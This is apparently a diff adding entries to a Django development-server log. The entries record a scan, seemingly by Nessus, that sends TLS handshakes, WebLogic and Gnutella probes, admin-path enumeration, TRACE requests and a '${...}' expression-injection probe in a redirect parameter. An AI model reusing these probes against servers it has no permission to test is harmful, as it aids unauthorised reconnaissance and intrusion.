@@ -27492,3 +27492,3316 @@ Not Found: /nul.dbm
 [01/Oct/2023 04:57:30] "GET /?redirect:%24%7B57550614%2b16044095%7D HTTP/1.1" 200 35341
 [01/Oct/2023 04:57:31,094] - Broken pipe from ('130.253.2.83', 36428)
 
+[08/Oct/2023 04:33:07,791] - Broken pipe from ('130.253.1.147', 52030)
+
+[08/Oct/2023 04:33:12,273] - Broken pipe from ('130.253.1.147', 52128)
+
+[08/Oct/2023 04:33:36] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00¿\x01\x00\x00»\x03\x01L\x8eá¤\x18é\x88T/Ö@T')
+[08/Oct/2023 04:33:36] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[08/Oct/2023 04:33:36] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x00\x00}\x01\x00\x00y\x03\x00\x1aÖ\x80yý#ÔÖ^\x0f½\x91\x86¼x\x01Á1VÇÝ0\x87õ')
+[08/Oct/2023 04:33:36] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[08/Oct/2023 04:33:36,224] - Broken pipe from ('130.253.1.147', 33818)
+
+[08/Oct/2023 04:33:36] code 400, message Bad request syntax ('\x16\x03\x01\x00¿\x01\x00\x00»\x03\x02å¯ß6\x8b\x89 âO\x1dx\x8c\x0f\x009±¼ðô_\x08\x1e÷\x87ÙÞ$?\x0f\x1dñ\x8e\x00\x00RÀ')
+[08/Oct/2023 04:33:36] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[08/Oct/2023 04:33:36] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x034\x8a%)æùÎ`Ö¹Z\x95ý\x9e~Òï\x87ØNû\x87\\PÑ\x9ej')
+[08/Oct/2023 04:33:36] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[08/Oct/2023 04:33:36] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00ø\x01\x00\x00ô\x03\x03ótB\x971\x02\x98¸ÚjSÃ')
+[08/Oct/2023 04:33:36] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[08/Oct/2023 04:33:37] code 400, message Bad request syntax ('\x16\x03\x01\x02·\x01\x00\x02³\x03\x03e"1!i7Z8GtL_hnUugmAlu2EBEWS0aazJ\x00\x02@À\x98ÀsÀv\x00\x9b\x00»\x00\x95À\x83\x00Ã\x00«Ìª\x00\x89\x00Bÿà\x00©\x00\x15À9\x00&ÀtÌ«\x00-\x00\x80\x00¾À\x9cÀ*À)\x00h\x00(\x00d\x00`À\x86\x00k\x00\x1fÀ£\x00)À¡À\x9f\x00¼À\x12\x00\'\x009À¥\x00\x9a\x00²À¯\x00ºÀ\x8e\x00\x87\x00¬À+À\x8c\x00FÀ\x1aÀ\x07\x00$\x00bÀ6À\x1e\x00+þþÀ-\x005ÿáÀ~ÀuÌ¬À8À\x08\x00\x86À\x90\x00µÀ\x8f\x00¹À/\x00\x9eÀz\x00\x0f\x00\x98\x00jÀ\xa0\x00\x91À«À\x9a\x00?À\x0c\x00\x9cÀ\x13À;\x00\x1d\x00\x1a\x00\x82\x00\x92À¦\x000À\x8a\x00:\x00\xadÀy\x00¤À\x9bÀ\x8b\x00\x00Ì\xadÀ\x82\x00cÀ0\x001\x00\xa0\x00·À\r\x00mÀ\x9e\x00ÂÀ\'À,À©À2À\x14\x00\x17À\x1bþÿÀ\x15\x00ª\x00\x8c\x00±À§\x00\x04À!\x00\x07\x00e\x00\x18\x00\x9d\x002\x00£\x00\x1eÀ\x95À1À\x04\x00\x19\x00\x01\x00<À\x91\x00\x96\x00\x16À\x93\x00\x8fÀ\x7fÀ$À\x18\x00%ÀªÀ\x9dÀ¤\x00¥\x00aÀ¢\x00¯Ì¨À:\x00¨\x00E\x00/À#\x00¡\x00\t\x00>Àw\x00¦Àx\x00\x8b\x00\x8aÀ&\x00Ä\x00\x06\x00AÀ\x8d\x007\x00³Ì©À\x17À\x03À\t\x00D\x00\x12\x00\x0e\x006\x00®À\x85À\x80À\xad\x00\x9f\x00\x81\x00\x11À\x05\x00\x1cÀ7\x00l\x00¸À"\x00\x08À\x89À\x97\x00\x1bÀ\x96\x00C\x00\x0b\x00\x84À\x06Àr\x00¢\x00\x83\x00fÀ4\x00´\x00#À%\x00¶\x00ÀÀ\x99À}\x00°\x00\x13À|\x00¿À\x87\x00,\x00*\x00Á\x008\x00\x05\x004\x00gÀ(\x00\x88À\x94À¬À\x02À\x11À\x81À\x0bÀ\x0e\x00\x10\x00\x0cÀ\x19À¨À\x10À\x88\x00 \x00.\x00\x8eÀ\x84\x00iÀ\x16À5À\x1f\x00')
+[08/Oct/2023 04:33:37] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[08/Oct/2023 04:33:38] code 400, message Bad request syntax ('\x16\x03\x00\x02k\x01\x00\x02g\x03\x03e"1"KPV131wnVufmySyAL9qasXqXG9XY\x00\x02@À\x98ÀsÀv\x00\x9b\x00»\x00\x95À\x83\x00Ã\x00«Ìª\x00\x89\x00Bÿà\x00©\x00\x15À9\x00&ÀtÌ«\x00-\x00\x80\x00¾À\x9cÀ*À)\x00h\x00(\x00d\x00`À\x86\x00k\x00\x1fÀ£\x00)À¡À\x9f\x00¼À\x12\x00\'\x009À¥\x00\x9a\x00²À¯\x00ºÀ\x8e\x00\x87\x00¬À+À\x8c\x00FÀ\x1aÀ\x07\x00$\x00bÀ6À\x1e\x00+þþÀ-\x005ÿáÀ~ÀuÌ¬À8À\x08\x00\x86À\x90\x00µÀ\x8f\x00¹À/\x00\x9eÀz\x00\x0f\x00\x98\x00jÀ\xa0\x00\x91À«À\x9a\x00?À\x0c\x00\x9cÀ\x13À;\x00\x1d\x00\x1a\x00\x82\x00\x92À¦\x000À\x8a\x00:\x00\xadÀy\x00¤À\x9bÀ\x8b\x00\x00Ì\xadÀ\x82\x00cÀ0\x001\x00\xa0\x00·À\r\x00mÀ\x9e\x00ÂÀ\'À,À©À2À\x14\x00\x17À\x1bþÿÀ\x15\x00ª\x00\x8c\x00±À§\x00\x04À!\x00\x07\x00e\x00\x18\x00\x9d\x002\x00£\x00\x1eÀ\x95À1À\x04\x00\x19\x00\x01\x00<À\x91\x00\x96\x00\x16À\x93\x00\x8fÀ\x7fÀ$À\x18\x00%ÀªÀ\x9dÀ¤\x00¥\x00aÀ¢\x00¯Ì¨À:\x00¨\x00E\x00/À#\x00¡\x00\t\x00>Àw\x00¦Àx\x00\x8b\x00\x8aÀ&\x00Ä\x00\x06\x00AÀ\x8d\x007\x00³Ì©À\x17À\x03À\t\x00D\x00\x12\x00\x0e\x006\x00®À\x85À\x80À\xad\x00\x9f\x00\x81\x00\x11À\x05\x00\x1cÀ7\x00l\x00¸À"\x00\x08À\x89À\x97\x00\x1bÀ\x96\x00C\x00\x0b\x00\x84À\x06Àr\x00¢\x00\x83\x00fÀ4\x00´\x00#À%\x00¶\x00ÀÀ\x99À}\x00°\x00\x13À|\x00¿À\x87\x00,\x00*\x00Á\x008\x00\x05\x004\x00gÀ(\x00\x88À\x94À¬À\x02À\x11À\x81À\x0bÀ\x0e\x00\x10\x00\x0cÀ\x19À¨À\x10À\x88\x00 \x00.\x00\x8eÀ\x84\x00iÀ\x16À5À\x1f\x00')
+[08/Oct/2023 04:33:38] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[08/Oct/2023 04:33:43,138] - Broken pipe from ('130.253.1.147', 35028)
+
+[08/Oct/2023 04:33:45] "GET / HTTP/1.0" 200 35341
+[08/Oct/2023 04:33:45] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:33:47] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:33:47] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:33:48,689] - Broken pipe from ('130.253.1.147', 39512)
+
+[08/Oct/2023 04:33:48] code 400, message Bad request syntax ("\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03¯²ÈÃ6dÏ\x85\x93ñ©\x1f\x1b?îIºá0é.à¥v«Â/qâÏq¯ |cmÍ\x80\x8e¨3\xa0BÊÂqT\tÄõíNÎeAÔÅé¦Ð×ô³ß\x9c\x00Ò\x13\x02\x13\x03\x13\x01À,À0\x00£\x00\x9fÌ©Ì¨ÌªÀ¯À\xadÀ£À\x9fÀ]ÀaÀWÀS\x00§À+À/\x00¢\x00\x9eÀ®À¬À¢À\x9eÀ\\À`ÀVÀR\x00¦À$À(\x00k\x00jÀsÀw\x00Ä\x00Ã\x00m\x00ÅÀ#À'\x00g\x00@ÀrÀv\x00¾\x00½\x00l\x00¿À")
+[08/Oct/2023 04:33:48] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[08/Oct/2023 04:33:51,122] - Broken pipe from ('130.253.1.147', 39582)
+
+[08/Oct/2023 04:33:52] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x9f\x97x:8\x10\xad\x0cÐÚwâ"Û7mïBØ\x1aØN\x99ðÁ·)l\x1e\\¡h \x0eV0ÚGÆ\x90¦-\x99\x1fìmÈõvu\x8a\x13s¾;\x9aqj\x8fó_\x10*¾L\x00Ò\x13\x02\x13\x03\x13\x01À,À0\x00£\x00\x9fÌ©Ì¨ÌªÀ¯À\xadÀ£À\x9fÀ]ÀaÀWÀS\x00§À+À/\x00¢\x00\x9eÀ®À¬À¢À\x9eÀ\\À`ÀVÀR\x00¦À$À(\x00k\x00jÀsÀw\x00Ä\x00Ã\x00m\x00ÅÀ#À\'\x00g\x00@ÀrÀv\x00¾\x00½\x00l\x00¿À')
+[08/Oct/2023 04:33:52] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[08/Oct/2023 04:33:54] code 400, message Bad request syntax ("\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03Î¡ÂEï?\x17{¹P0$»\x97â·\x0f&çN¼\x1f]\x8bõ]~ú\x84¸\tÛ È£f\x1a%\x88\x07F\rc7$ÅëÁL²\x0c\x1eÄÞgÓ;e};\x1c8þ¶U\x00Ò\x13\x02\x13\x03\x13\x01À,À0\x00£\x00\x9fÌ©Ì¨ÌªÀ¯À\xadÀ£À\x9fÀ]ÀaÀWÀS\x00§À+À/\x00¢\x00\x9eÀ®À¬À¢À\x9eÀ\\À`ÀVÀR\x00¦À$À(\x00k\x00jÀsÀw\x00Ä\x00Ã\x00m\x00ÅÀ#À'\x00g\x00@ÀrÀv\x00¾\x00½\x00l\x00¿À")
+[08/Oct/2023 04:33:54] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[08/Oct/2023 04:33:56] code 400, message Bad HTTP/0.9 request type ('t3')
+[08/Oct/2023 04:33:56] "t3 12.2.1" 400 -
+[08/Oct/2023 04:33:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:33:56] "GET / HTTP/1.1" 200 35341
+Not Found: /api/hpe-restapi.json
+[08/Oct/2023 04:33:57] "GET /api/hpe-restapi.json HTTP/1.1" 404 5343
+[08/Oct/2023 04:33:57,149] - Broken pipe from ('130.253.1.147', 46410)
+
+[08/Oct/2023 04:33:58] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03<´\x82J\x823Ò\x17ºDWÏ\x1eÉ\x94¦oò¯ªW\x9dZ¼·H\xa0gíÈòS M«Î¿aLÁ"\t\xad³·\x1eÎM\x90\x05UKì\x99}âÖ\x95êã\x1a-cè·\x00Ò\x13\x02\x13\x03\x13\x01À,À0\x00£\x00\x9fÌ©Ì¨ÌªÀ¯À\xadÀ£À\x9fÀ]ÀaÀWÀS\x00§À+À/\x00¢\x00\x9eÀ®À¬À¢À\x9eÀ\\À`ÀVÀR\x00¦À$À(\x00k\x00jÀsÀw\x00Ä\x00Ã\x00m\x00ÅÀ#À\'\x00g\x00@ÀrÀv\x00¾\x00½\x00l\x00¿À')
+[08/Oct/2023 04:33:58] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[08/Oct/2023 04:34:06,516] - Broken pipe from ('130.253.1.147', 49680)
+
+[08/Oct/2023 04:34:06] code 400, message Bad request syntax ("\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x92oÝ@ô6´\x8c·TT½çû±æ÷-ã\x8bO\x953ÉÒ÷~å;ã{á ý#v¼«à\x0bú\x9aá%ö\x90\x86ä¹C\x90\xa0\x1e\x17¤%>\x85\x0cH0\x94ìn\x7f\x00Ò\x13\x02\x13\x03\x13\x01À,À0\x00£\x00\x9fÌ©Ì¨ÌªÀ¯À\xadÀ£À\x9fÀ]ÀaÀWÀS\x00§À+À/\x00¢\x00\x9eÀ®À¬À¢À\x9eÀ\\À`ÀVÀR\x00¦À$À(\x00k\x00jÀsÀw\x00Ä\x00Ã\x00m\x00ÅÀ#À'\x00g\x00@ÀrÀv\x00¾\x00½\x00l\x00¿À")
+[08/Oct/2023 04:34:06] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[08/Oct/2023 04:34:06] "GET / HTTP/1.1" 200 35341
+Not Found: /favicon2.iso
+[08/Oct/2023 04:34:07] "GET /favicon2.iso HTTP/1.1" 404 5319
+Not Found: /favicon.iso
+[08/Oct/2023 04:34:07] "GET /favicon.iso HTTP/1.1" 404 5316
+[08/Oct/2023 04:34:07,364] - Broken pipe from ('130.253.1.147', 53320)
+
+[08/Oct/2023 04:34:07] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:07] "GET / HTTP/1.1" 200 35341
+Not Found: /properties/description.dhtml
+[08/Oct/2023 04:34:07] "GET /properties/description.dhtml HTTP/1.1" 404 5367
+Not Found: /properties/configuration.php
+[08/Oct/2023 04:34:07] "GET /properties/configuration.php?tab=Status HTTP/1.1" 404 5378
+Not Found: /header.php
+[08/Oct/2023 04:34:07] "GET /header.php?tab=status HTTP/1.1" 404 5324
+[08/Oct/2023 04:34:07,989] - Broken pipe from ('130.253.1.147', 53838)
+
+[08/Oct/2023 04:34:08] "GET / HTTP/1.1" 200 35341
+Not Found: /aboutprinter.html
+[08/Oct/2023 04:34:08] "GET /aboutprinter.html HTTP/1.1" 404 5334
+Not Found: /properties/configuration.php
+[08/Oct/2023 04:34:08] "GET /properties/configuration.php?tab=Status HTTP/1.1" 404 5378
+[08/Oct/2023 04:34:08,242] - Broken pipe from ('130.253.1.147', 54014)
+
+[08/Oct/2023 04:34:08] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:08] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:08,482] - Broken pipe from ('130.253.1.147', 54238)
+
+[08/Oct/2023 04:34:08] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:08] "GET / HTTP/1.1" 200 35341
+Not Found: /login.php
+[08/Oct/2023 04:34:08] "GET /login.php HTTP/1.1" 404 5310
+Not Found: /this_server/all_settings.shtml
+[08/Oct/2023 04:34:08] "GET /this_server/all_settings.shtml HTTP/1.1" 404 5373
+[08/Oct/2023 04:34:08] "GET / HTTP/1.1" 200 35341
+Not Found: /authenticate/login
+[08/Oct/2023 04:34:08] "GET /authenticate/login HTTP/1.1" 404 5337
+Not Found: /start.js
+[08/Oct/2023 04:34:08] "GET /start.js HTTP/1.1" 404 5307
+Not Found: /tmui/
+[08/Oct/2023 04:34:09] "GET /tmui/ HTTP/1.1" 404 5298
+Not Found: /login
+[08/Oct/2023 04:34:09] "GET /login HTTP/1.1" 404 5298
+Not Found: /netmri/config/userAdmin/login.tdf
+[08/Oct/2023 04:34:09] "GET /netmri/config/userAdmin/login.tdf HTTP/1.1" 404 5382
+Not Found: /scgi-bin/platform.cgi
+[08/Oct/2023 04:34:09] "GET /scgi-bin/platform.cgi HTTP/1.1" 404 5346
+[08/Oct/2023 04:34:09] "GET /admin/login.do HTTP/1.1" 302 0
+Not Found: /en/main.js
+[08/Oct/2023 04:34:09] "GET /en/main.js HTTP/1.1" 404 5313
+Not Found: /mgmt/login
+[08/Oct/2023 04:34:09] "GET /mgmt/login?dest=%2Fmgmt%2Fgui%3Fp%3Dhome&reason=&username= HTTP/1.1" 404 5369
+Not Found: /dms2/Login.jsp
+[08/Oct/2023 04:34:09] "GET /dms2/Login.jsp HTTP/1.1" 404 5325
+Not Found: /login
+[08/Oct/2023 04:34:09] "GET /login HTTP/1.1" 404 5298
+Not Found: /home.htm
+[08/Oct/2023 04:34:10] "GET /home.htm HTTP/1.1" 404 5307
+Not Found: /sws/data/sws_data.js
+[08/Oct/2023 04:34:10] "GET /sws/data/sws_data.js HTTP/1.1" 404 5343
+Not Found: /wcd/system.xml
+[08/Oct/2023 04:34:10] "GET /wcd/system.xml HTTP/1.1" 404 5325
+Not Found: /js/Device.js
+[08/Oct/2023 04:34:10] "GET /js/Device.js HTTP/1.1" 404 5319
+Not Found: /ptz.htm
+[08/Oct/2023 04:34:10] "GET /ptz.htm HTTP/1.1" 404 5304
+[08/Oct/2023 04:34:10] "GET /admin/login.jsp HTTP/1.1" 302 0
+Not Found: /loginMsg.js
+[08/Oct/2023 04:34:11] "GET /loginMsg.js HTTP/1.1" 404 5316
+[08/Oct/2023 04:34:11,044] - Broken pipe from ('130.253.1.147', 54536)
+
+[08/Oct/2023 04:34:11] code 400, message Bad HTTP/0.9 request type ('GNUTELLA')
+[08/Oct/2023 04:34:11] "GNUTELLA CONNECT/0.6" 400 -
+[08/Oct/2023 04:34:11] code 400, message Bad HTTP/0.9 request type ('GNUTELLA')
+[08/Oct/2023 04:34:11] "GNUTELLA CONNECT/0.4" 400 -
+[08/Oct/2023 04:34:11] "GET / HTTP/1.1" 200 35341
+Not Found: /login.html
+[08/Oct/2023 04:34:11] "GET /login.html HTTP/1.1" 404 5313
+[08/Oct/2023 04:34:11,478] - Broken pipe from ('130.253.1.147', 56488)
+
+[08/Oct/2023 04:34:11] "GET / HTTP/1.1" 200 35341
+Not Found: /Home.do
+[08/Oct/2023 04:34:11] "GET /Home.do HTTP/1.1" 404 5304
+[08/Oct/2023 04:34:12,165] - Broken pipe from ('130.253.1.147', 56760)
+
+[08/Oct/2023 04:34:12] code 400, message Bad request version ('Secure-HTTP/1.4')
+[08/Oct/2023 04:34:12] "Secure * Secure-HTTP/1.4" 400 -
+[08/Oct/2023 04:34:12] code 400, message Bad request version ('request')
+[08/Oct/2023 04:34:12] "some invalid request" 400 -
+[08/Oct/2023 04:34:12] "GET / HTTP/1.1" 200 35341
+Not Found: /http:/rfi.nessus.org/check_proxy.html
+[08/Oct/2023 04:34:12] "GET http://rfi.nessus.org/check_proxy.html HTTP/1.0" 404 1869
+[08/Oct/2023 04:34:12,532] - Broken pipe from ('130.253.1.147', 57462)
+
+[08/Oct/2023 04:34:12] "GET / HTTP/1.1" 200 35341
+Not Found: /admin_ui/mas/ent/login.html
+[08/Oct/2023 04:34:12] "GET /admin_ui/mas/ent/login.html HTTP/1.1" 404 5364
+[08/Oct/2023 04:34:12,852] - Broken pipe from ('130.253.1.147', 57690)
+
+[08/Oct/2023 04:34:12] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:13] "GET // HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:13,234] - Broken pipe from ('130.253.1.147', 57920)
+
+Not Found: /intruvert/jsp/admin/Login.jsp
+[08/Oct/2023 04:34:13] "GET /intruvert/jsp/admin/Login.jsp HTTP/1.1" 404 5364
+Not Found: /commoncgi/servlet/CCGIServlet
+[08/Oct/2023 04:34:13] "GET /commoncgi/servlet/CCGIServlet?ApHost=PDT_InterScan_NT&CGIAlias=PDT_InterScan_NT&File=logout.htm HTTP/1.1" 404 5438
+[08/Oct/2023 04:34:13] "GET / HTTP/1.1" 200 35341
+Not Found: /xmldata
+[08/Oct/2023 04:34:13] "GET /xmldata?item=All HTTP/1.1" 404 5313
+Not Found: /upnp/BasicDevice.xml
+[08/Oct/2023 04:34:13] "GET /upnp/BasicDevice.xml HTTP/1.1" 404 5343
+[08/Oct/2023 04:34:13] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:13,787] - Broken pipe from ('130.253.1.147', 58438)
+
+[08/Oct/2023 04:34:13] "GET / HTTP/1.1" 200 35341
+Not Found: /robots.txt
+[08/Oct/2023 04:34:13] "GET /robots.txt HTTP/1.1" 404 5313
+Not Found: /sitemap.xml
+[08/Oct/2023 04:34:13] "GET /sitemap.xml HTTP/1.1" 404 5316
+Not Found: /.cobalt
+[08/Oct/2023 04:34:14] "GET /.cobalt HTTP/1.1" 404 5304
+Not Found: /admin.back
+[08/Oct/2023 04:34:14] "GET /admin.back HTTP/1.1" 404 5313
+Not Found: /file
+[08/Oct/2023 04:34:14] "GET /file HTTP/1.1" 404 5295
+Not Found: /wavemaster.internal
+[08/Oct/2023 04:34:14] "GET /wavemaster.internal HTTP/1.1" 404 5340
+[08/Oct/2023 04:34:14] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:14] "GET / HTTP/1.1" 200 35341
+Forbidden (CSRF cookie not set.): /
+[08/Oct/2023 04:34:14] "NLBFSA / HTTP/1.1" 403 2870
+[08/Oct/2023 04:34:14,428] - Broken pipe from ('130.253.1.147', 58712)
+
+[08/Oct/2023 04:34:14] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:14] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:14,837] - Broken pipe from ('130.253.1.147', 59318)
+
+Not Found: /MSWSMTP/Common/Authentication/Logon.aspx
+[08/Oct/2023 04:34:14] "GET /MSWSMTP/Common/Authentication/Logon.aspx HTTP/1.1" 404 5397
+[08/Oct/2023 04:34:14] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:15] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:15,571] - Broken pipe from ('130.253.1.147', 59738)
+
+[08/Oct/2023 04:34:15] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:16] "OPTIONS / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:16,190] - Broken pipe from ('130.253.1.147', 60446)
+
+Not Found: /sdCtxLveLDe1.html
+[08/Oct/2023 04:34:16] "GET /sdCtxLveLDe1.html HTTP/1.1" 404 5328
+Not Found: /sdCtxLveLDe1.cgi
+[08/Oct/2023 04:34:16] "GET /sdCtxLveLDe1.cgi HTTP/1.1" 404 5325
+Not Found: /sdCtxLveLDe1.sh
+[08/Oct/2023 04:34:16] "GET /sdCtxLveLDe1.sh HTTP/1.1" 404 5322
+Not Found: /sdCtxLveLDe1.pl
+[08/Oct/2023 04:34:17] "GET /sdCtxLveLDe1.pl HTTP/1.1" 404 5322
+Not Found: /sdCtxLveLDe1.inc
+[08/Oct/2023 04:34:17] "GET /sdCtxLveLDe1.inc HTTP/1.1" 404 5325
+Not Found: /sdCtxLveLDe1.shtml
+[08/Oct/2023 04:34:17] "GET /sdCtxLveLDe1.shtml HTTP/1.1" 404 5331
+Not Found: /sdCtxLveLDe1.asp
+[08/Oct/2023 04:34:17] "GET /sdCtxLveLDe1.asp HTTP/1.1" 404 5325
+Not Found: /sdCtxLveLDe1.php
+[08/Oct/2023 04:34:17] "GET /sdCtxLveLDe1.php HTTP/1.1" 404 5325
+Not Found: /sdCtxLveLDe1.php3
+[08/Oct/2023 04:34:18] "GET /sdCtxLveLDe1.php3 HTTP/1.1" 404 5328
+Not Found: /sdCtxLveLDe1.cfm
+[08/Oct/2023 04:34:18] "GET /sdCtxLveLDe1.cfm HTTP/1.1" 404 5325
+Not Found: /cgi-bin/sdCtxLveLDe1.html
+[08/Oct/2023 04:34:18] "GET /cgi-bin/sdCtxLveLDe1.html HTTP/1.1" 404 5352
+Not Found: /cgi-bin/sdCtxLveLDe1.cgi
+[08/Oct/2023 04:34:18] "GET /cgi-bin/sdCtxLveLDe1.cgi HTTP/1.1" 404 5349
+Not Found: /cgi-bin/sdCtxLveLDe1.sh
+[08/Oct/2023 04:34:18] "GET /cgi-bin/sdCtxLveLDe1.sh HTTP/1.1" 404 5346
+Not Found: /cgi-bin/sdCtxLveLDe1.pl
+[08/Oct/2023 04:34:19] "GET /cgi-bin/sdCtxLveLDe1.pl HTTP/1.1" 404 5346
+Not Found: /cgi-bin/sdCtxLveLDe1.inc
+[08/Oct/2023 04:34:19] "GET /cgi-bin/sdCtxLveLDe1.inc HTTP/1.1" 404 5349
+Not Found: /cgi-bin/sdCtxLveLDe1.shtml
+[08/Oct/2023 04:34:19] "GET /cgi-bin/sdCtxLveLDe1.shtml HTTP/1.1" 404 5355
+Not Found: /cgi-bin/sdCtxLveLDe1.asp
+[08/Oct/2023 04:34:19] "GET /cgi-bin/sdCtxLveLDe1.asp HTTP/1.1" 404 5349
+Not Found: /cgi-bin/sdCtxLveLDe1.php
+[08/Oct/2023 04:34:19] "GET /cgi-bin/sdCtxLveLDe1.php HTTP/1.1" 404 5349
+Not Found: /cgi-bin/sdCtxLveLDe1.php3
+[08/Oct/2023 04:34:20] "GET /cgi-bin/sdCtxLveLDe1.php3 HTTP/1.1" 404 5352
+Not Found: /cgi-bin/sdCtxLveLDe1.cfm
+[08/Oct/2023 04:34:20] "GET /cgi-bin/sdCtxLveLDe1.cfm HTTP/1.1" 404 5349
+Not Found: /scripts/sdCtxLveLDe1.html
+[08/Oct/2023 04:34:20] "GET /scripts/sdCtxLveLDe1.html HTTP/1.1" 404 5352
+Not Found: /scripts/sdCtxLveLDe1.cgi
+[08/Oct/2023 04:34:20] "GET /scripts/sdCtxLveLDe1.cgi HTTP/1.1" 404 5349
+Not Found: /scripts/sdCtxLveLDe1.sh
+[08/Oct/2023 04:34:20] "GET /scripts/sdCtxLveLDe1.sh HTTP/1.1" 404 5346
+Not Found: /scripts/sdCtxLveLDe1.pl
+[08/Oct/2023 04:34:20] "GET /scripts/sdCtxLveLDe1.pl HTTP/1.1" 404 5346
+Not Found: /scripts/sdCtxLveLDe1.inc
+[08/Oct/2023 04:34:21] "GET /scripts/sdCtxLveLDe1.inc HTTP/1.1" 404 5349
+Not Found: /scripts/sdCtxLveLDe1.shtml
+[08/Oct/2023 04:34:21] "GET /scripts/sdCtxLveLDe1.shtml HTTP/1.1" 404 5355
+Not Found: /scripts/sdCtxLveLDe1.asp
+[08/Oct/2023 04:34:21] "GET /scripts/sdCtxLveLDe1.asp HTTP/1.1" 404 5349
+Not Found: /scripts/sdCtxLveLDe1.php
+[08/Oct/2023 04:34:21] "GET /scripts/sdCtxLveLDe1.php HTTP/1.1" 404 5349
+Not Found: /scripts/sdCtxLveLDe1.php3
+[08/Oct/2023 04:34:21] "GET /scripts/sdCtxLveLDe1.php3 HTTP/1.1" 404 5352
+Not Found: /scripts/sdCtxLveLDe1.cfm
+[08/Oct/2023 04:34:22] "GET /scripts/sdCtxLveLDe1.cfm HTTP/1.1" 404 5349
+[08/Oct/2023 04:34:22] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:22] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03ÄáÓ¸Bd¾®Pìd\x11yBê2ÿÊ\x87Wzwss+géMÔ¦ì')
+[08/Oct/2023 04:34:22] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /ext-js/app/common/zld_product_spec.js
+[08/Oct/2023 04:34:22] "GET /ext-js/app/common/zld_product_spec.js HTTP/1.1" 404 5394
+[08/Oct/2023 04:34:22] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:22,948] - Broken pipe from ('130.253.1.147', 37134)
+
+[08/Oct/2023 04:34:23] "GET / HTTP/1.1" 200 35341
+Not Found: /Nessus1337014470.html
+[08/Oct/2023 04:34:23] "TRACE /Nessus1337014470.html HTTP/1.1" 404 5342
+Not Found: /Nessus1337014470.html
+[08/Oct/2023 04:34:23] "TRACK /Nessus1337014470.html HTTP/1.1" 404 5342
+[08/Oct/2023 04:34:23,538] - Broken pipe from ('130.253.1.147', 37444)
+
+[08/Oct/2023 04:34:23] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:23] "GET / HTTP/1.1" 200 35341
+Not Found: /xampp/index.php
+[08/Oct/2023 04:34:24] "GET /xampp/index.php HTTP/1.1" 404 5328
+[08/Oct/2023 04:34:24] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:24,413] - Broken pipe from ('130.253.1.147', 38090)
+
+Not Found: /Wsusadmin/Errors/BrowserSettings.aspx
+[08/Oct/2023 04:34:24] "GET /Wsusadmin/Errors/BrowserSettings.aspx HTTP/1.1" 404 5388
+[08/Oct/2023 04:34:24] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:24,756] - Broken pipe from ('130.253.1.147', 38142)
+
+[08/Oct/2023 04:34:24] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:24] "GET / HTTP/1.1" 200 35341
+Not Found: /nessus345678.html
+Not Found: /SnoopServlet/
+[08/Oct/2023 04:34:25] "GET /nessus345678.html HTTP/1.1" 404 5334
+[08/Oct/2023 04:34:25] "GET /SnoopServlet/ HTTP/1.1" 404 5322
+[08/Oct/2023 04:34:25,983] - Broken pipe from ('130.253.1.147', 38980)
+
+Not Found: /snoopservlet/
+[08/Oct/2023 04:34:26] "GET /snoopservlet/ HTTP/1.1" 404 5322
+[08/Oct/2023 04:34:26] "GET / HTTP/1.1" 200 35341
+Not Found: /snoop/
+Not Found: /robots.txt
+[08/Oct/2023 04:34:26] "GET /robots.txt HTTP/1.1" 404 5313
+[08/Oct/2023 04:34:26] "GET /snoop/ HTTP/1.1" 404 5301
+[08/Oct/2023 04:34:26,491] - Broken pipe from ('130.253.1.147', 39978)
+
+Not Found: /favicon.ico
+Not Found: /servlet/SnoopServlet/
+[08/Oct/2023 04:34:26] "GET /favicon.ico HTTP/1.1" 404 5310
